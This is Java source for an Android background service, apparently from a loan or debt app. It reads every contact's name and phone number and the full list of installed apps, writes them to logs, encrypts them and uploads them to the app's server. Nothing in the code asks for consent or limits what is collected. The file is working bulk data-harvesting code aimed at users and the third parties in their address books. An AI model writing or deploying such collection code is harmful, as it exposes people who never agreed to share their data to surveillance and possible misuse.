package com.penyelesaian.xjd.hutang.service;

import android.app.IntentService;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.text.TextUtils;


import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.penyelesaian.xjd.hutang.BuildConfig;
import com.penyelesaian.xjd.hutang.manager.Constant;
import com.penyelesaian.xjd.hutang.manager.UpTotal;
import com.penyelesaian.xjd.hutang.manager.UpTotalApi;
import com.penyelesaian.xjd.hutang.model.ResponseModel;
import com.penyelesaian.xjd.hutang.util.DesUtils;
import com.penyelesaian.xjd.hutang.util.LogUtil;

import java.util.List;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class UploadContactService extends IntentService {

    private JSONArray mContactArray;
    private JSONArray mAppsArray;


    public UploadContactService(){
        super("UploadContactService");
    }


    @Override
    protected void onHandleIntent(Intent intent) {

        getContacts();
        readApp();
        uploadData();
    }



    //获取通讯录数据
    public void getContacts(){
        mContactArray = new JSONArray();
        mContactArray.clear();
        try {
            Cursor cursor = getApplicationContext().getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);
            //moveToNext方法返回的是一个boolean类型的数据
            while (cursor != null && cursor.moveToNext()) {
                //读取通讯录的姓名
                String name = cursor.getString(cursor
                        .getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                //读取通讯录的号码
                String phone = cursor.getString(cursor
                        .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                if(!TextUtils.isEmpty(name) && !TextUtils.isEmpty(phone)){
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("name", name);
                    jsonObject.put("phone", phone);
                    mContactArray.add(jsonObject);
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    /**
     * 获取已安装app
     */
    private void readApp() {
        mAppsArray = new JSONArray();
        mAppsArray.clear();
        PackageManager pm = getPackageManager();
        List<PackageInfo> list2 = pm.getInstalledPackages(PackageManager.GET_UNINSTALLED_PACKAGES);
        for (PackageInfo packageInfo : list2) {
            JSONObject jsonObject = new JSONObject();
            String appName = packageInfo.applicationInfo.loadLabel(getPackageManager()).toString();
            String packageName = packageInfo.packageName;
            String appInstallTime = packageInfo.lastUpdateTime + "";
            if (!TextUtils.isEmpty(appName) && !TextUtils.isEmpty(packageName)
                    && !TextUtils.isEmpty(appInstallTime)) {
                jsonObject.put("name", appName);
                jsonObject.put("packageName", packageName);
                jsonObject.put("installTime", appInstallTime);
                mAppsArray.add(jsonObject);
            }
        }
    }


    private void uploadData(){
        if(mContactArray.size() > 0 && mAppsArray.size() > 0){
            Retrofit retrofit = new Retrofit.Builder()
                    .baseUrl(BuildConfig.server_api)
                    .addConverterFactory(GsonConverterFactory.create())
                    .build();
            UpTotalApi upTotalApi = retrofit.create(UpTotalApi.class);

            LogUtil.e("cList-->" + mContactArray.toJSONString().replace("\"", "\\\""));
            LogUtil.e("appList-->" + mAppsArray.toJSONString().replace("\"", "\\\""));

            String iv = Constant.getIV();
            String data = Constant.getParams(iv)
                    .setParams("cList", mContactArray.toJSONString().replace("\"", "\\\""))
                    .setParams("appList", mAppsArray.toJSONString().replace("\"", "\\\""))
                    .build();

            upTotalApi.upData(iv, data).enqueue(new Callback<ResponseModel>() {
                @Override
                public void onResponse(Call<ResponseModel> call, Response<ResponseModel> response) {
                    if(null != response.body()){
                        if(response.body().getCode() == 0){
                            String s = "data";
                            try{
                                s = DesUtils.decode(response.body().getData(), response.body().getIv());
                            }catch (Exception e){
                                e.printStackTrace();
                            }
                            LogUtil.e("data-->" + s);
                            UploadContactService.this.stopSelf();
                        }
                    }
                }

                @Override
                public void onFailure(Call<ResponseModel> call, Throwable t) {

                }
            });

        }
    }


}
